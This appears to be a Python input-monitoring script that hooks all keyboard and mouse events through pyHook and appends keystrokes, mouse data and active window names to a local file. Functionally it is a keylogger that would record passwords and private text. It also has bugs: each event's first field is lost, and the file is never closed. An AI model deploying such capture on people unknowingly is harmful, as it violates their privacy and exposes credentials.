import pythoncom, pyHook, datetime


class Auditor:

	def __init__(self, windowName = None):
		self.applicationFilter = windowName

	def audit(self, data):
		if self.applicationFilter is not None:
			# Filter out event data that didn't take place in the window specified by windowName
			if data["WindowName"] == self.applicationFilter:
				self.transcribe(data)

		else:
			self.transcribe(data)

	# Write data passed by Listener to data file.
	def transcribe(self, data):
		dataFile = open("eventData.dat", 'a')

		firstWrite = True
		for key, value in data.items():
			if not firstWrite:
				dataFile.write(">> {}|{}\n".format(key, value))

			else:
				a = datetime.datetime.now()
				dataFile.write(":: {}\n".format(a.now().strftime('%H:%M:%S.%f')))
				firstWrite = False

class Listener:

	hookManager = pyHook.HookManager()

	def __init__(self, auditor = None):
		if auditor == None:
			print("Critical Error: No auditor passed into Listener.")


		self.auditor = auditor	
		self.hookManager.MouseAll = self.onMouseEvent
		self.hookManager.KeyDown = self.onKeyBoardEvent
		self.hookManager.HookMouse()
		self.hookManager.HookKeyboard()
		pythoncom.PumpMessages() # Lets program sit forever, and wait for events.


	# Grabs Mouse Event Data
	def onMouseEvent(self, event):
		mouseEventData = {
				"MessageName":event.MessageName,
				"Message":event.Message,
				"Window":event.Window,
				"WindowName":event.WindowName,
				"Position":event.Position,
				"Wheel":event.Wheel,
				}

		self.auditor.audit(mouseEventData)

	# Grabs Keyboard Event Data
	def onKeyBoardEvent(self, event):
		keybdEventData = {
				"MessageName":event.MessageName,
				"Message":event.Message,
				"Time":event.Time,
				"Window":event.Window,
				"WindowName":event.WindowName,
				'Ascii':chr(event.Ascii),
				'Key':event.Key,
				'KeyID':event.KeyID,
				'ScanCode':event.ScanCode,
				'Extended':event.Extended,
				'Alt':event.Alt,
				'Transition':event.Transition
				}

		self.auditor.audit(keybdEventData)
